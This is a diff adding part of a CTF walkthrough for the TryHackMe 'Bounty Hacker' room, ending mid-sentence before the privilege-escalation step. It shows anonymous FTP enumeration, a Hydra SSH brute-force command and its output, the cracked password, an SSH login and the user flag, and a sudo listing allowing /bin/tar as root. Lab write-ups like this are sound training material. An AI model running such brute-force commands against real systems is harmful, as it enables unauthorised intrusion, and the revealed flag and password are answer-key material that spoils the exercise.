@@ -52,4 +52,116 @@ Nmap done: 1 IP address (1 host up) scanned in 125.25 seconds
 
 Upon checking the ftp server, we have listed 2 files below:
 
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
+└─$ ftp 10.10.110.227
+Connected to 10.10.110.227.
+220 (vsFTPd 3.0.3)
+Name (10.10.110.227:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||32186|)
+ftp: Can't connect to `10.10.110.227:32186': Connection timed out
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+ftp> get task.txt
+local: task.txt remote: task.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+100% |*************************************************************************|    68      477.74 KiB/s    00:00 ETA
+226 Transfer complete.
+68 bytes received in 00:00 (0.11 KiB/s)
+ftp> get locks.txt
+local: locks.txt remote: locks.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+100% |*************************************************************************|   418       10.39 KiB/s    00:00 ETA
+226 Transfer complete.
+418 bytes received in 00:00 (0.65 KiB/s)
+ftp>
+```
+
+On task.txt, we can see the user who wrote the file:
+
+![[Pasted image 20220819053322.png]]
+
+On locks.txt, we can also see that it is a wordlist for potential bruteforce attack.
+
+Webpage at port 80:
+
+![[Pasted image 20220819053420.png]]
+
+After enumerating those things, we can now proceed with brutefoce `lin` using hydra and the locks.txt wordlist:
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
+└─$ hydra -l lin -P ~/ken/MoonShine/CTF/Bounty_Hacker/locks.txt 10.10.110.227 ssh -t 4
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-19 05:27:00
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.10.110.227:22/
+[22][ssh] host: 10.10.110.227   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-19 05:27:17
+                                                                                                                      
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Bounty_Hacker]
+└─$ 
+
+```
+
+
+What is the user's password:
+- RedDr4gonSynd1cat3
+
+Login to lin using ssh to get the user.txt flag:
+
+```
+
+┌──(kali㉿kali)-[~]
+└─$ ssh lin@10.10.110.227
+The authenticity of host '10.10.110.227 (10.10.110.227)' can't be established.
+ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.110.227' (ED25519) to the list of known hosts.
+lin@10.10.110.227's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+lin@bountyhacker:~/Desktop$ cat user.txt 
+THM{CR1M3_SyNd1C4T3}
+
+
+```
+
+lastly, upon checking, we can see that user lin has privileges for root using the /bin/tar below:
+
+```
+lin@bountyhacker:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+lin@bountyhacker:~/Desktop$
+```
+
+Looking at GTFObins documentation, we can see that 
+
 
